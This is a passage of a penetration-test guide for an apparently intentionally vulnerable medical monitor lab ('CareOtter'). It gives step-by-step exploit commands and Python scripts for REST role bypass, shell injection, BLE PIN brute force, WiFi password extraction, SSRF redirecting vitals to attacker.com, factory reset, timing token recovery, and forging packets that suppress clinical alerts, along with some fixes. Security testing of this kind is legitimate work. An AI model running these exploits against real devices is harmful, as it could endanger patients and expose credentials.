curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"service":"medical-sensor"}' \
  http://localhost:5002/api/services/restart
```

*3D. Shell injection via WiFi configuration (privilege escalation to RCE):*

```bash
curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"ssid":"'\''; touch /tmp/patient_pwned #","password":"12345678"}' \
  http://localhost:5002/api/network/wifi
```

Then verify on the Raspberry Pi:
```bash
ls -la /tmp/patient_pwned
# File created by patient-owned token via "admin" endpoint
```

#### Expected Result

All four requests above return `200 OK` (or `201`/`202`) instead of `403 Forbidden`. The patient token is accepted because `@token_required` validates the JWT signature and expiration but **never evaluates the `role` claim**.

Specifically:
- `/api/network` returns the full `raw` field containing `/etc/config/wireless` with the PSK in plaintext.
- `/api/config/thresholds` returns `THRESHOLDS_UPDATED` with BPM range `0–255` and SpO₂ minimum `0`, effectively disabling all clinical alerts.
- `/api/services/restart` returns `REBOOT_OK` and the medical sensor stops streaming.
- `/api/network/wifi` returns `WIFI_UPDATED` and the injected shell command executes on the Pi.

#### How It Should Be

The REST layer should enforce role-based access control with the same rigor as the Web UI layer. The minimal fix is to introduce an `@admin_required` decorator for REST endpoints and apply it to all administrative functions:

```python
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        payload = _decode_and_validate()
        if not payload or payload.get('role') != 'admin':
            return jsonify({
                'error': 'Admin access required',
                'code': 'FORBIDDEN'
            }), 403
        return f(*args, **kwargs)
    return decorated
```

Then replace `@token_required` with `@admin_required` on:
- `GET /api/network`
- `POST /api/network/wifi`
- `POST /api/config/preferences`
- `POST /api/config/thresholds`
- `POST /api/services/restart`
- `GET /api/logs`
- `GET /api/devices`
- `POST /api/devices`

Endpoints that are legitimately accessible to both roles (e.g., `GET /api/vitals`, `GET /api/vitals/history`) can continue using `@token_required`, but should ideally use `@role_required('admin', 'patient')` for explicitness.

#### Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Authorization | Role-enforcing decorator on every admin REST endpoint | Prevent patients from invoking admin functions |
| Authorization | Deny-by-default — return `403` if role is missing or unexpected | Fail closed rather than fail open |
| Audit | Log every API call with `username`, `role`, `endpoint`, and `source_ip` | Enable forensic tracing of unauthorized access attempts |
| Testing | Automated BFLA test suite — patient JWT against every admin endpoint | Detect regressions where `@token_required` replaces `@admin_required` |

---

## Section C — BLE / Mobile App

### BLE-01 — Missing BLE Pairing / Bonding

**Documentation:** `CareOtter_App.md` VULN #1 / M4  
**OWASP:** Mobile M3 — Insecure Authentication/Authorization
**Type:** CWE-306  
**Severity:** High

#### Steps to Reproduce

```bash
# Use a secondary BLE adapter to advertise
sudo hciconfig hci0 name "CareOtter_HR"
sudo hciconfig hci0 leadv 0
```

#### Expected Result

The Android `careotter_app` automatically connects to the fake device without requesting pairing, without verifying MAC address, and without checking service UUIDs.

---

### BLE-02 — Unencrypted BLE Channel

**Documentation:** `CareOtter_App.md` VULN #5  
**OWASP:** Mobile M5 — Insecure Communication
**Type:** CWE-319  
**Severity:** Medium

#### Steps to Reproduce

```bash
# On rooted Android: enable HCI snoop
adb shell settings put global bluetooth_hci_snoop_log 1

# Run the app and connect to the device
adb pull /data/misc/bluetooth/logs/btsnoop_hci.log

# Analyze with Wireshark (filter: btle.gatt)
```

#### Expected Result

Wireshark shows the Heart Rate and SpO₂ GATT notifications in plaintext, without LE Secure Connections encryption.

---

### BLE-03 — Plaintext External Storage Logging

**Documentation:** `CareOtter_App.md` VULN #3  
**OWASP:** Mobile M9 — Insecure Data Storage
**Type:** CWE-312  
**Severity:** Medium

#### Steps to Reproduce

```bash
# Extract vitals log from external storage
adb shell cat /sdcard/careotter_vitals.log
```

#### Expected Result

The file contains historical BPM and SpO₂ readings with timestamps in plaintext, readable by any app with `READ_EXTERNAL_STORAGE` permission.

---

### BLE-04 — Hidden Diagnostic Panel

**Documentation:** `CareOtter_App.md` VULN #6  
**OWASP:** Mobile M8 — Security Misconfiguration
**Type:** CWE-912  
**Severity:** Low

#### Steps to Reproduce

```bash
# Method A: Static decompilation
jadx careotter_app.apk -d output/
grep -r "DIAG_TAP_TARGET\|diagTapCount" output/

# Method B: Dynamic
# In the app, tap 5 times quickly (within 3 seconds) on the title
# "CareOtter Monitor". The threshold panel will appear.
```

#### Expected Result

The `DIAG` panel appears with editable JSON field and Read/Write Threshold buttons, which is normally hidden (`android:visibility="gone"`).

---

### BLE-05 — Unvalidated GATT Writes

**Documentation:** `CareOtter_App.md` VULN #2  
**OWASP:** Mobile M4 — Insufficient Input/Output Validation
**Type:** CWE-20  
**Severity:** High

#### Steps to Reproduce

```bash
# From nRF Connect or bleak script:
# UUID: 0000ff01-0000-1000-8000-00805f9b34fb
# Value (UTF-8): {"bpm_min":0,"bpm_max":300,"spo2_min":0}
```

#### Expected Result

The device accepts the JSON without validating clinical ranges. The app reflects the values and alerts are suppressed.

---

### BLE-06 — CSCP v1 Hardcoded Key Extraction (M1)

**Documentation:** `CareOtter_App.md` M1  
**OWASP:** Mobile M1 — Improper Credential Usage
**Type:** CWE-798  
**Severity:** Critical

#### Steps to Reproduce

```bash
# Extract key from APK
strings careotter_app.apk | grep "careotter-key-16"

# From device firmware
strings /opt/medical-sensor/ble_server.py | grep "key-"
```

#### Expected Result

The AES-128-ECB key `careotter-key-16` is found in plaintext both in the APK and in the BLE server firmware.

---

### BLE-07 — CSCP v1 Threshold Forging (M3)

> **Re-classified (2026-06-12):** this BLE CSCP threshold-forging case is now catalogued under OWASP IoT as [`Vulns/IoT/IoT7_Insecure_Data_Transfer_and_Storage.md`](Vulns/IoT/IoT7_Insecure_Data_Transfer_and_Storage.md) (the related hidden provisioning backdoor moved to [`Vulns/IoT/IoT2_Insecure_Network_Services.md`](Vulns/IoT/IoT2_Insecure_Network_Services.md) §2.4). The M3 framing below is retained as the original mobile lens.

**Documentation:** `CareOtter_App.md` M3  
**OWASP:** Mobile M3 — Insecure Authentication/Authorization
**Type:** CWE-306 + CWE-20  
**Severity:** Critical

#### Steps to Reproduce

Use the script from **Annex B** (`forge_threshold.py`):

```bash
pip install bleak pycryptodome
python3 forge_threshold.py
```

#### Expected Result

The 24-byte packet is immediately accepted by `ble_server.py`. Lethal thresholds (`bpm_min=0`, `bpm_max=255`, `spo2_min=0`) are applied without clinical range validation.

---

---

### BLE-08 — Hidden Provisioning Service Discovery (P1)

> TESTED

**Documentation:** `CareOtter.md` P1  
**OWASP:** IoT I3 — Insecure Ecosystem Interfaces / Mobile M8
**Type:** CWE-200 (Information Disclosure) + CWE-912 (Hidden Functionality)
**Severity:** High

#### Steps to Reproduce

```python
from bleak import BleakClient, BleakScanner

async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR")
    async with BleakClient(device) as c:
        services = await c.get_services()
        for s in services.services.values():
            if "ff10" in s.uuid:
                print("[+] Hidden provisioning service found:", s.uuid)
                for ch in s.characteristics:
                    print("    -", ch.uuid, ch.properties)

import asyncio
asyncio.run(main())
```

#### Expected Result
`0xFF10` is listed among the discovered services, even though **it is not advertised**. Its characteristics `0xFF11` (read/write/notify) and `0xFF12` (read/write) are visible.

1. Passive BLE Reconnaissance (Advertising Scan)
The attacker begins by scanning the 2.4 GHz spectrum for nearby BLE peripherals. With any standard tool they would see:

| Tool | Command / Action |
|------|------------------|
| nRF Connect (Android/iOS) | Scan → filter by name CareOtter_HR |
| bluetoothctl (Linux) | see "BlueZ discovery filter" box below |
| hcitool | hcitool lescan |
| Bleak (Python) | BleakScanner.discover() |

> **BlueZ discovery filter — required when `scan on` does not list `CareOtter_HR`**
>
> The Raspberry Pi BCM4345C0 PCB antenna typically reports between −80 and −90 dBm
> at lab distance. BlueZ default `DiscoveryFilter` drops everything below ≈−80 dBm
> and collapses duplicate adv reports, so `bluetoothctl` shows nothing even though
> `sudo btmon` is receiving `LE Advertising Report` packets at the HCI layer.
> Lower the filter before starting the scan:
>
> ```text
> bluetoothctl
> [bluetooth]# menu scan
> [bluetooth]# transport le         # only LE events (drop BR/EDR)
> [bluetooth]# rssi -100             # accept weak signal (default ~-80)
> [bluetooth]# duplicate-data on     # do not collapse repeated adv
> [bluetooth]# pattern CareOtter     # match by name / UUID / MAC
> [bluetooth]# back
> [bluetooth]# scan on
> ```
>
> If the device still does not appear, confirm at the HCI layer with
> `sudo btmon | grep -i careotter` — if `btmon` sees `Name (complete): CareOtter_HR`
> but `bluetoothctl` does not, the issue is purely the discovery filter (not the Pi
> radio).

What they would see in the advertisement:

Name: CareOtter_HR
Advertised UUIDs: 0x180D (Heart Rate), 0x1822 (SpO2), 0x180F (Battery), 0x180A (Device Info), 0xFF00 / 0xFF01 (Alert/Config)
Key observation: The advertisement does NOT list 0xFF10. An attentive auditor would note: "The device declares 6 public services, but the advertising fields are not saturated; there is room for more. What lies behind the connection?"

2. Connection and Full GATT Enumeration
This is where discovery happens. The hacker connects and enumerates ALL services, not just the advertised ones:

With bluetoothctl / gatttool
```
bluetoothctl
connect XX:XX:XX:XX:XX:XX
menu gatt
list-attributes
```

With gatttool (more explicit)
```
gatttool -b XX:XX:XX:XX:XX:XX -I
[XX:XX:XX:XX:XX:XX][LE]> connect
[XX:XX:XX:XX:XX:XX][LE]> primary
```

With Python + Bleak (without the annex script, writing their own reconnaissance)
```python
import asyncio
from bleak import BleakClient, BleakScanner

async def recon():
    dev = await BleakScanner.find_device_by_name("CareOtter_HR")
    async with BleakClient(dev) as client:
        services = await client.get_services()
        for svc in services:
            print(f"[+] Service: {svc.uuid}")
            for ch in svc.characteristics:
                print(f"    Char: {ch.uuid} | Props: {ch.properties}")

asyncio.run(recon())
```

Unexpected result: A seventh service appears:

```
[+] Service: 0000ff10-0000-1000-8000-00805f9b34fb
    Char: 0000ff11-0000-1000-8000-00805f9b34fb | Props: ['read', 'write', 'notify']
    Char: 0000ff12-0000-1000-8000-00805f9b34fb | Props: ['read', 'write']
```

3. Analysis of the Hidden Service (Manual Interaction)
The hacker now knows there is a service the manufacturer does not publicly declare. The next step is to determine what it does, interactively:

3.1 Read characteristics without authentication
```
# With gatttool
char-read-uuid 0xFF11
char-read-uuid 0xFF12
```

3.2 Observe responses
0xFF11 (read): Returns a JSON with fields like wifi_ssid, wifi_psk, cloud_url → WiFi credential leak (this connects to BLE-10/P5).
0xFF12 (read): Returns an attempt counter or an authentication state.

3.3 Test unauthenticated writes
Write a test JSON to 0xFF11:

```json
{"cmd":"wifi_get"}
```

If it responds with sensitive data, the hacker confirms the channel is functional and unprotected by default.

4. Validation of the "Hidden Functionality" Hypothesis
To report this as a vulnerability and not as an "undocumented feature," the hacker needs evidence that the manufacturer intentionally hid it:

| Test | Evidence |
|------|----------|
| Advertising packets | Compare advertisement_data.service_uuids vs get_services(). If 0xFF10 is in GATT but not in AD, it is deliberate. |
| Manufacturer documentation | Search clinical manuals, datasheets, or official apps. If they do not mention "Factory Provisioning" or "Technician," it is hidden functionality. |
| UUID space | 0xFF10-0xFF12 falls in the "vendor specific" range (not standardized by Bluetooth SIG), typical of factory functions. |
| Official app behavior | If the CareOtter Flutter app does not list 0xFF10 in its UI or in decompiled source (JADX), it confirms a channel not exposed to the end user. |

5. Scalability: Discovering the Rest of the Chain
Once 0xFF10 is found, the hacker already has the entry point to chain everything else without needing the annex scripts:

| Discovery | Manual Method | Result |
|-----------|---------------|--------|
| P3 — PIN brute force | Write 0000..9999 to 0xFF12, measure response latency | PIN 6767 accepted in <100 ms |
| P4 — Shell injection | Write `{"cmd":"wifi_set","ssid":"'; touch /tmp/pwned; #"}` to 0xFF11 | Remote command execution |
| P6 — SSRF | `{"cmd":"cloud_set","url":"http://attacker.com"}` | Device sends vitals to attacker |
| P7 — Factory reset | `{"cmd":"factory_reset"}` | Erasure without confirmation or additional auth |
| P8 — No expiration | Leave device 30 min, repeat previous steps | Channel remains active |

6. Report Draft (Example Structure)
The hacker would document as follows:

VULNERABILITY: Hidden Factory Provisioning Service (P1)

CWE-200 (Information Exposure) + CWE-912 (Hidden Functionality)

Description:
The CareOtter_HR device exposes an unadvertised GATT service (0xFF10) containing two characteristics (0xFF11, 0xFF12). This channel allows WiFi network configuration, cloud backend redirection, and device factory reset. Since it does not appear in advertising packets nor in the product's clinical documentation, it constitutes hidden factory functionality accessible to any attacker with BLE access.

Steps to Reproduce:

1. Scan BLE peripherals and locate CareOtter_HR.
2. Connect via BleakClient or gatttool.
3. Execute get_services() / primary.
4. Observe that 0xFF10 is present despite not being in advertisement.service_uuids.

Impact:
High — Allows an unauthenticated attacker (after trivial brute-force of the 4-digit PIN) to reconfigure the device, extract WiFi credentials, redirect medical data to arbitrary servers, or erase patient configuration.

Recommendation:

- Remove service 0xFF10 in production builds, OR
- Add robust authentication (not a 4-digit PIN) and rate-limiting, OR
- Implement the 30-minute expiration mechanism that the documentation promises but the firmware does not enforce.

Summary of the Attacker Mindset

| Phase | Mindset | Typical Tool |
|-------|---------|--------------|
| Scan | "What it advertises vs. what it actually has?" | nRF Connect, bluetoothctl |
| Enumerate | "Connect and list the ENTIRE GATT tree" | gatttool, Bleak |
| Diff | "Are there UUIDs in GATT that are not in the advertisement?" | Custom 10-line script |
| Interact | "What does it return if I read/write without knowing the protocol?" | Trial and error with JSON |
| Chain | "This hidden service is the gateway to everything else" | Incremental manual exploit |

The key lies in the difference between advertisement_data and get_services(): many developers assume that "if I don't advertise it, no one will find it," but BLE requires GATT enumeration after connection; any BLE client performs it automatically. The hacker does not need the annex script: they only need to connect and list attributes — something any BLE app on the market does.

---

### BLE-09 — Factory PIN Brute Force (P3)

**Documentation:** `CareOtter.md` P3  
**OWASP:** IoT I5 — Insecure Ecosystem Interfaces / Mobile M1
**Type:** CWE-307 + CWE-798  
**Severity:** High

#### Steps to Reproduce

```python
from bleak import BleakClient, BleakScanner

async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR")
    async with BleakClient(device) as c:
        for pin in range(0, 10000):
            pin_str = f"{pin:04d}"
            await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", pin_str.encode())
            data = await c.read_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb")
            remaining = int(json.loads(data.decode())["attempts_remaining"])
            if remaining == 3:  # reset after success
                print(f"[+] PIN found: {pin_str}")
                break

import asyncio, json
asyncio.run(main())
```

#### Expected Result
The PIN `6767` is accepted. There is no lockout after thousands of failed attempts.

---

### BLE-10 — WiFi PSK Extraction (P5)

**Documentation:** `CareOtter.md` P5  
**OWASP:** IoT I6 — Insufficient Privacy Protection
**Type:** CWE-312  
**Severity:** High

#### Steps to Reproduce

```python
import json
from bleak import BleakClient

async def extract_wifi(mac):
    async with BleakClient(mac) as c:
        await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", b"6767")
        data = await c.read_gatt_char("0000ff11-0000-1000-8000-00805f9b34fb")
        cfg = json.loads(data.decode())
        print(f"SSID: {cfg['wifi_ssid']}, PSK: {cfg['wifi_psk']}")
```

#### Expected Result
The current WiFi password is returned in the `wifi_psk` field in plaintext.

---

### BLE-11 — Shell Injection via Provisioning (P4)

**Documentation:** `CareOtter.md` P4  
**OWASP:** IoT I9 — Insecure Default Settings / Mobile M7
**Type:** CWE-78  
**Severity:** Critical

#### Steps to Reproduce

```python
import json
from bleak import BleakClient

PAYLOAD = json.dumps({"cmd":"wifi_set","ssid":"'; touch /tmp/ble_pwned; #'","psk":"x"})

async def exploit(mac):
    async with BleakClient(mac) as c:
        await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", b"6767")
        await c.write_gatt_char("0000ff11-0000-1000-8000-00805f9b34fb", PAYLOAD.encode())
        print("[+] Shell injection delivered")
```

#### Expected Result
The command `touch /tmp/ble_pwned` is executed on the monitor. Verify on the Raspberry Pi:
```bash
ls /tmp/ble_pwned
```

---

### BLE-12 — SSRF via Cloud URL Redirection (P6)

**Documentation:** `CareOtter.md` P6  
**OWASP:** API7 — Server Side Request Forgery / IoT I3
**Type:** CWE-918  
**Severity:** High

#### Steps to Reproduce

```python
import json
from bleak import BleakClient

PAYLOAD = json.dumps({"cmd":"cloud_set","url":"http://attacker.com:5002"})

async def exploit(mac):
    async with BleakClient(mac) as c:
        await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", b"6767")
        await c.write_gatt_char("0000ff11-0000-1000-8000-00805f9b34fb", PAYLOAD.encode())
```

#### Expected Result
The monitor redirects all subsequent Cloud API calls to the attacker's server. Verify by reading `0xFF11` (`cloud_get` / `ReadValue`) — the `cloud_url` field reflects the malicious URL.

---

### BLE-13 — Factory Reset Behind Hardcoded PIN (P7)

**Documentation:** `CareOtter.md` P7
**OWASP:** IoT I9 — Insecure Default Settings / Mobile M3 — Insecure Authentication/Authorization
**Type:** CWE-798 (Hardcoded Credentials) + CWE-307 (Improper Restriction of Excessive Auth Attempts) + CWE-306 (Missing Authentication for Critical Function — applied here to the **absence of a second confirmation factor** on a destructive operation)
**Severity:** Critical

> **Behaviour change (post-hardening):** `ProvisioningConfigChrc.WriteValue` now rejects every command — including `factory_reset` — unless `_provisioning_state["authenticated"]` is `True`. The PIN gate is enforced, so this is no longer a "no-auth" issue. The PIN itself is still hardcoded (`PROV_PIN_FACTORY = "6767"`, identical across every device, recoverable from firmware `strings`) and `ProvisioningAuthChrc` has no real lockout, so a single PIN write — or, if the value is unknown, the full 10 000-entry brute-force documented in [BLE-09](#ble-09--factory-pin-brute-force-p3) — restores the original "single-write factory wipe" capability.

#### Steps to Reproduce

```python
import json, asyncio
from bleak import BleakClient

AUTH_UUID   = "0000ff12-0000-1000-8000-00805f9b34fb"
CONFIG_UUID = "0000ff11-0000-1000-8000-00805f9b34fb"
PAYLOAD = json.dumps({"cmd": "factory_reset"}).encode()

async def exploit(mac):
    async with BleakClient(mac) as c:
        # 1. MANDATORY: pass the PIN gate first. Without this the server logs
        #    "[BLE] Provisioning command rejected — PIN not verified" and the
        #    factory_reset write is silently dropped.
        await c.write_gatt_char(AUTH_UUID, b"6767")
        # 2. Now the destructive command is accepted with no second confirmation.
        await c.write_gatt_char(CONFIG_UUID, PAYLOAD)

asyncio.run(exploit("AA:AA:AA:AA:AA:AA"))
```

#### Expected Result
With the PIN entered, factory configuration is restored immediately. WiFi is deconfigured (`/etc/config/wireless` reverts to defaults). The monitor loses connectivity until new provisioning. The destructive write requires no physical button press, no second factor, and no admin re-auth — the **same** factory PIN that gates `wifi_set` and `cloud_set` is sufficient to wipe the device.

Negative control (verifies the gate is active):
```bash
# Skip the PIN write — the command must be silently dropped:
# logread -e BLE  →  "[BLE] Provisioning command rejected — PIN not verified"
```

---

### BLE-14 — Provisioning Channel Never Expires (P8)

**Documentation:** `CareOtter.md` P8  
**OWASP:** IoT I7 — Insecure Data Transfer and Storage / Mobile M3
**Type:** CWE-912  
**Severity:** Medium

#### Steps to Reproduce

1. Leave the monitor powered on for >30 minutes.
2. Execute any of the BLE-08 through BLE-13 exploits.

#### Expected Result
The provisioning channel still responds normally. The manufacturer documentation states it should be closed after 30 minutes, but the firmware never performs the check.

---

## Section D — Medical Sensor HTTP

### SENSOR-01 — Hardcoded API Token

**Documentation:** `CareOtter.md` Vuln #13  
**OWASP:** IoT I1 — Weak, Guessable, or Hardcoded Passwords  
**Type:** CWE-798 (Hardcoded Credentials)  
**Severity:** High

#### Why It Matters

The medical sensor service (`sensor_service.py`) protects sensitive endpoints (`/vitals`, `/log`, `/alerts`, `/thresholds`) with a hardcoded API token. Like the IGP admin token, this string is embedded as a literal in the Python source and is visible to anyone with read access to the firmware or the running binary.

#### Steps to Reproduce

```bash
# A) Static extraction — token lives in the config file shipped with the firmware
cat /opt/medical-sensor/config.json | python3 -m json.tool | grep api_key
# → "api_key": "careotter-2024-lab"

# Or grep the Python module — it falls back to the same default literal
grep -n "api_key" /opt/medical-sensor/sensor_service.py

# B) Verify the unauthenticated probe is blocked AND leaks the header name (vuln #15)
curl -s -i http://192.168.2.1:8081/vitals | tail -1
# → {"error": "unauthorized", "hint": "X-API-Key header required"}

# C) Authenticated read with the extracted token
curl -s -H "X-API-Key: careotter-2024-lab" http://192.168.2.1:8081/vitals
```

#### Expected Result

- `cat config.json` reveals `api_key` → `careotter-2024-lab` (or `grep` finds the default literal in `sensor_service.py`).
- Request without the header → HTTP 401 with `{"error":"unauthorized","hint":"X-API-Key header required"}`.
- Request with correct token → valid vitals JSON (HTTP 200).

---

### SENSOR-02 — Timing Side-Channel in Auth

**Documentation:** `CareOtter.md` Vuln #14  
**OWASP:** IoT I9 — Insecure Default Settings  
**Type:** CWE-208 (Observable Timing Discrepancy)  
**Severity:** Medium

#### Why It Matters

The `_check_auth()` method compares the supplied `X-API-Key` header against `API_KEY` using Python's `==` operator. This creates a timing side-channel: the comparison exits early on the first mismatched byte, causing slightly shorter execution times for wrong prefixes. An attacker on the same local network can measure response times across many requests and recover the token byte-by-byte.

#### Steps to Reproduce

```bash
# Baseline — first byte correct ("c") vs. wrong ("x")
python3 -c "
import time, requests, statistics
url = 'http://192.168.2.1:8081/vitals'

def avg_time(prefix, n=20):
    times = []
    for _ in range(n):
        t0 = time.perf_counter()
        requests.get(url, headers={'X-API-Key': prefix}, timeout=2)
        times.append(time.perf_counter() - t0)
    return statistics.mean(times)

print('cxxxx:', avg_time('c' + 'x'*17))   # correct first byte (token starts with 'c')
print('xxxxx:', avg_time('x' + 'x'*17))   # wrong first byte
"
```

#### Expected Result

The mean response time for tokens starting with `c` (correct first byte of `careotter-2024-lab`) is measurably longer than tokens starting with `x` (wrong first byte), confirming the timing leak. In a real attack this would be repeated iteratively to reconstruct the full token.

---

### SENSOR-03 — Information Disclosure via 401 Hint

**Documentation:** `CareOtter.md` Vuln #15  
**OWASP:** IoT I6 — Insufficient Privacy Protection  
**Type:** CWE-200 (Information Exposure)  
**Severity:** Low

#### Why It Matters

Every protected endpoint (`/config`, `/vitals`, `/log`, `/log/last`, `/reload`, `/alerts`) returns the **same** 401 response on unauthenticated access:

```json
{"error": "unauthorized", "hint": "X-API-Key header required"}
```

The `hint` field names the expected header verbatim. A network-only attacker who has no firmware access and no APK to decompile can still go from blind probing ("this port speaks HTTP, what auth scheme?") to a targeted token hunt ("I need a value for `X-API-Key`") with a single `curl` against any protected route. Combined with the timing side-channel ([SENSOR-02](#sensor-02--timing-side-channel-in-auth)) this turns reconnaissance into byte-by-byte token recovery.

#### Steps to Reproduce

```bash
# Probe any protected endpoint without auth — they all leak the same hint
curl -s -i http://192.168.2.1:8081/config | tail -1
curl -s -i http://192.168.2.1:8081/vitals | tail -1
curl -s -i http://192.168.2.1:8081/log    | tail -1
```

#### Expected Result

All three commands return the same 401 body with the `hint` field naming `X-API-Key`. `/health` is the only endpoint that legitimately responds without auth (liveness probe, returns plain `ok`).

---

## Quick Validation Checklist

| ID | Vulnerability | Command / Script | Expected Result |
|----|---------------|------------------|-----------------|
| IGP-01 | Hardcoded token | `strings careservice \| grep Otter` | `OtterMobile2026` in plaintext |
| IGP-02 | WiFi PSK leak | `python3 igp_helper.py 0x03` | `option key '...'` visible |
| IGP-03 | TLV underflow | `igp 0x04` with `\xAA\xFF\x41\x41` | Crash or anomalous behavior |
| IGP-04 | Format string | `igp 0x05 '%x.%x.%x'` | Stack leak in response |
| IGP-05 | Shell injection | `igp 0x06 "'; touch /tmp/pwned #\|x"` | File created on RPi |
| IGP-06 | Global auth | `igp 0x03` without prior auth on new TCP | Returns data (RESTRICTED expected) |
| IGP-07 | Therapy format string | `igp 0x0B '%x.%x.%x'` | Stack leak in `careotter_events.log` |
| IGP-08 | Alert cmd injection | `igp 0x0C "test'; touch /tmp/pwned #"` | File created on RPi |
| API-01 | Weak JWT secret | Sign token with `careotter_jwt_2026` | API accepts forged token |
| API-02 | WiFi raw field | `GET /api/network` with JWT | `.raw` field with PSK |
| API-03 | Format string proxy | `GET /api/device/status?module=%x.%x.%x` | Stack leak from careservice |
| API-04 | Flask debug | `curl /console` or trigger traceback | Werkzeug debugger exposed |
| API-05 | SHA-256 no salt | `echo -n 'CareOtter2026!' \| sha256sum` | Matches hash in SQLite |
| API-06 | Role bypass | Token from `patient` on `/api/network` | Patient accesses admin data |
| BLE-01 | No pairing | Fake `CareOtter_HR` advertiser | App connects without verifying MAC |
| BLE-02 | BLE plaintext | `btsnoop_hci.log` + Wireshark | BPM/SpO₂ in cleartext |
| BLE-03 | SD card log | `adb shell cat /sdcard/careotter_vitals.log` | Vitals in plaintext |
| BLE-04 | Hidden panel | 5 taps on title or JADX | DIAG panel visible |
| BLE-05 | Unvalidated write | Write malformed JSON to `0xFF01` | Device accepts without validation |
| BLE-06 | CSCP key leak | `strings apk \| grep key-16` | `careotter-key-16` exposed |
| BLE-07 | Alert suppression | `forge_threshold.py` with `(0,255,0)` | Lethal thresholds applied |
| BLE-08 | Hidden service | `discover_services()` in bleak | UUID `0xFF10` visible |
| BLE-09 | PIN brute force | `for pin in range(10000)` on `0xFF12` | PIN `6767` accepted |
| BLE-10 | WiFi PSK leak | `read_gatt_char(0xFF11)` | `wifi_psk` in plaintext |
| BLE-11 | BLE shell injection | `wifi_set` with SSID `'; touch /tmp/pwned; #'` | File created on RPi |
| BLE-12 | SSRF cloud_set | `cloud_set` to `http://attacker.com` | Malicious URL persisted |
| BLE-13 | Factory reset behind hardcoded PIN | Write `6767` to `0xFF12`, then `{"cmd":"factory_reset"}` to `0xFF11` | Config erased; pre-PIN write is dropped with log `"PIN not verified"` |
| BLE-14 | Channel never expires | Wait 30 min and repeat BLE-08~13 | Channel still active |
| SENSOR-01 | Hardcoded sensor token | `grep api_key /opt/medical-sensor/config.json` | `"api_key": "careotter-2024-lab"` |
| SENSOR-02 | Timing side-channel | `for prefix in c x; do curl -H "X-API-Key: ${prefix}..."; done` | Mean time for `c...` > `x...` |
| SENSOR-03 | 401 `hint` leaks header name | `curl -s -i /config \| tail -1` | `"hint": "X-API-Key header required"` |

---

## Annexes

### A. IGP Helper Script

See [Common Helpers](#common-helpers).

### B. CSCP Threshold Forger Script

Save as `forge_threshold.py`:

```python
import asyncio
import struct
import binascii
from bleak import BleakClient, BleakScanner
from Crypto.Cipher import AES

THRESHOLD_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
CSCP_KEY       = b"careotter-key-16"
CSCP_MAGIC     = 0xCAFE0DDA


def forge_packet(bpm_min: int, bpm_max: int, spo2_min: int) -> bytes:
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct  = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ct


async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR", timeout=10.0)
    if not device:
        print("[-] Device not found")
        return
    async with BleakClient(device) as c:
        payload = forge_packet(0, 255, 0)   # suppress all clinical alerts
        await c.write_gatt_char(THRESHOLD_UUID, payload)
        print("[+] CSCP v1 lethal thresholds written — alerts suppressed")


if __name__ == "__main__":
    asyncio.run(main())
```

Dependency installation:
```bash
pip install bleak pycryptodome
```

---

## Execution Notes

- **Vulnerable mode:** Most API tests require `VULNERABLE=1` (default). Some vulnerabilities (such as the omission of the `raw` field in `/api/network`) disappear in `VULNERABLE=0`.
- **careservice binary:** If the RPi 3B (aarch64) rejects the 32-bit ARM binary, compile natively with `gcc careservice.c -o careservice` directly on the device.
- **BLE tests:** The RPi 3B with OpenWRT may lack Bluetooth firmware (`BCM43430`). If `hci0` is not present, the BLE server will not start and BLE tests must be run against the emulator or a second device with BlueZ.
